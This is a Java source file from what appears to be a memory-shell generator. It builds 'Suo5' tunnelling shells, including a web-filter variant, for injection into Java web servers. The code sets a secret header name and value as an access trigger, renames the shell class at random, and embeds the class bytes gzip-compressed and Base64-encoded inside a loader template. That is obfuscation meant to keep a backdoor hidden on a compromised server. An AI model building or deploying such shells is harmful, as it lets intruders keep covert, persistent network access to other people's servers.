package com.reajason.javaweb.memshell.shelltool.suo5;

import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.utils.CommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import com.reajason.javaweb.utils.Base64Utils;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/2/12
 */
public class Suo5Generator extends ByteBuddyShellGenerator<Suo5Config> {

    public Suo5Generator(ShellConfig shellConfig, Suo5Config suo5Config) {
        super(shellConfig, suo5Config);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        String template = shellToolConfig.getShellTemplateClassName();
        if (Suo5.class.getName().equals(template)
                || Suo5WebFilter.class.getName().equals(template)) {
            return redefineTemplate()
                    .field(named("headerName")).value(shellToolConfig.getHeaderName())
                    .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
        }
        try (DynamicType.Unloaded<Suo5> unloaded = new ByteBuddy()
                .redefine(Suo5.class)
                .name(CommonUtil.generateClassName())
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue())
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .make()) {
            byte[] shrinkBytes = ClassBytesShrink.shrink(unloaded.getBytes(), true);
            return redefineTemplate()
                    .field(named("suo5GZipBase64")).value(Base64Utils.encodeBase64String(CommonUtil.gzipCompress(shrinkBytes)));
        }
    }
}
